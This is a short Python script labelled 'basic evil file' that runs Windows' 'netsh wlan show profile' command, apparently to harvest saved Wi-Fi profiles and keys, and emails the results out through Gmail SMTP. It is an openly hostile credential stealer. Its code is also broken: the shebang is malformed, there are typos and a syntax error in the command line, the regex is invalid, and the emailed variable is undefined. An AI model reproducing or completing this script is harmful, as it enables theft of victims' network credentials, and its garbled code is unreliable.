#1/usr/bin/env python3
# basic evil file

import subprocess, smtplib
import re

def send_mail(email, password, message):
    # to use gmail smtp you will need to use 'less secure app' https://support.google.com/a/answer/182076
    # SMTP python resource https://docs.python.org/2/library/smtplib.html
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, passwrod)
    server.sendmail(email, email, message)
    server.quit()

# MS command
command = "netsh wlan show profile" key = clear
networks = subprocess.Popen(command, shell = True)
network_names = re.findall(('?:Profiles\s*:\s)(.*)', networks)
print(network_names)

send_mail('youremail@youremailprovider.com', '12345', result)
